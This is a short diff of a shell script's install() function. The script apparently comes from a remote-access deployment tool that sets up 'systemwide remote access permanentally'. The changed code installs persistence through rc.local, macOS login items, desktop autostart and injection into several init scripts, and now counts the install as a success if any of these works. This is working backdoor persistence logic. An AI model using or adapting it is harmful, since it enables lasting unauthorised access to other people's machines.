@@ -401,7 +401,7 @@ install_init_scripts() {
 install() {
 	[[ ! -z $QS_NOINST ]] && print_status "QS_NOINST is set. Skipping installation." && return 0
 	print_progress "Installing systemwide remote access permanentally" && print_ok
-
+  
 	## Root install methods
 	if [[ $UID -eq 0 ]];then
     if [[ $OS_NAME == "darwin" ]];then 
@@ -413,16 +413,19 @@ install() {
 		print_progress "Installing access via rc.local"
 	 	install_system_rclocal && print_ok && return 0 || print_fail
 	fi
+  
+  local is_installed=false
   ## User install methods
   if [[ $OS_NAME == "darwin" ]];then 
     print_progress "Installing access via login item"
-    setup_macos_login_item "user" && print_ok || print_fail
+    setup_macos_login_item "user" && is_installed=true && print_ok || print_fail
   else
     print_progress "Installing access via autostart"
-    install_desktop_autostart && print_ok || print_fail
+    install_desktop_autostart && is_installed=true && print_ok || print_fail
   fi
   ## Also inject into several init scripts just in case
-	install_init_scripts && return 0
+	install_init_scripts && is_installed=true
+  [[ "$is_installed" = true ]] && return 0
 	return 1
 }
 
